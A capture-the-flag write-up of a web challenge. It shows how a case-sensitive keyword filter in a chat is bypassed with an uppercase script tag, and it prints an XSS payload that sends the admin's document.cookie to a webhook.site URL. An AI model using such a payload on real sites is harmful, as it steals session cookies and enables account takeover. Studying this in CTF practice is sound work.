[../](../../)

# Cookie World Order

## web

> Good job! You found a further credential that looks like a VPN referred to as the cWo. The organization appears very clandestine and mysterious and reminds you of the secret ruling class of hard shelled turtle-like creatures of Xenon. Funny they trust their security to a contractor outside their systems, especially one with such bad habits.  Upon further snooping you find a video feed of those "Cauliflowers" which look to be the dominant lifeforms and members of the cWo. Go forth and attain greater access to reach this creature!
>
> [https://cwo-xss.web.ctfcompetition.com/](https://cwo-xss.web.ctfcompetition.com/)

The webpage lets you send messages in a chat and the admin is part of it. The url already hints, that it is a XSS challenge, where we have probably to leak the cookie from the admin, due to the challenge name.

So let's check for XSS and post a message that contains the `<script>` tag. Okay, not working, the message gets replaced with `HACKER ALERT!`.

Interestingly other tags, like `<img>` are working, the filter seems to check at least, if the message contains `script` or `alert`. But how good is this filter? When changing at least one letter to uppercase, it already seems to bypass it. So lets create a payload and try to leak the admin cookies to our webhook.

XSS payload:

```javascript
<SCRIPT>
	y = new XMLHttpRequest();
	y.open("GET", "https://webhook.site/02ad0379-670a-4c99-85ea-48b314484949/?" + document.cookie);
	y.send()
</SCRIPT>
```

Shortly after posting the message, the webhook receives a request with the admin cookies that contain the flag.

flag: `CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}`